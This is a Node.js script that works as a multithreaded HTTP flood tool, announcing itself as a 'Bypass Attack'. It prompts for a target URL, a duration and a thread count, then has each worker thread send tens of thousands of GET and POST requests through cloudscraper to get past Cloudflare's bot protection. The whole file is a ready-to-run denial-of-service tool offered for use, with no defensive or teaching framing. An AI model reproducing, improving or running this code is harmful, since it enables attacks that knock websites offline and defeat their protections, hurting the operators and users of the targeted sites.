const cloudscraper = require('cloudscraper');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const readline = require('readline');

if (isMainThread) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    rl.question('Enter target URL: ', (targetUrl) => {
        rl.question('Enter attack duration in seconds (e.g., 60): ', (duration) => {
            rl.question('Enter number of threads: ', (numThreads) => {
                rl.question('Enter message for POST requests: ', (postMessage) => {
                    const durationInt = parseInt(duration, 10);
                    const numThreadsInt = parseInt(numThreads, 10);

                    if (isNaN(durationInt) || isNaN(numThreadsInt) || durationInt <= 0 || numThreadsInt <= 0) {
                        console.error('Invalid input. Please enter positive numbers for duration and number of threads.');
                        rl.close();
                        return;
                    }

                    rl.close();
                    startAttack(targetUrl, durationInt, numThreadsInt, postMessage);
                });
            });
        });
    });
} else {
    const { target, duration, postMessage } = workerData;
    const endTime = Date.now() + duration * 1000;
    let requestCount = 0;

    const sendRequests = async () => {
        while (Date.now() < endTime && requestCount < 50000) {
            try {
                const promises = [];
                for (let i = 0; i < 50000; i++) {
                    promises.push(
                        cloudscraper.get(target)
                            .then(() => { requestCount++; })
                            .catch(() => { requestCount++; })
                    );
                    promises.push(
                        cloudscraper.post(target, { message: postMessage })
                            .then(() => { requestCount++; })
                            .catch(() => { requestCount++; })
                    );
                }
                await Promise.all(promises);
                parentPort.postMessage(100000); // Each loop sends 50k GET + 50k POST requests
            } catch (error) {
                console.error(`Error: ${error.message}`);
            }
        }
        parentPort.postMessage(requestCount);
        parentPort.close();
    };

    sendRequests();
}

function startAttack(target, duration, numThreads, postMessage) {
    console.log('Bypass Attack Started!');
    let totalRequestCount = 0;

    const updateCount = (increment) => {
        totalRequestCount += increment;
        console.log(`Total Requests sent: ${totalRequestCount}`);
    };

    const workerPromises = [];

    for (let i = 0; i < numThreads; i++) {
        workerPromises.push(new Promise((resolve, reject) => {
            const worker = new Worker(__filename, {
                workerData: { target, duration, postMessage }
            });
            worker.on('message', updateCount);
            worker.on('error', reject);
            worker.on('exit', resolve);
        }));
    }

    Promise.all(workerPromises).then(() => {
        console.log(`Bypass Attack finished. Total requests sent: ${totalRequestCount}`);
        process.exit(0);
    });
                  }
  
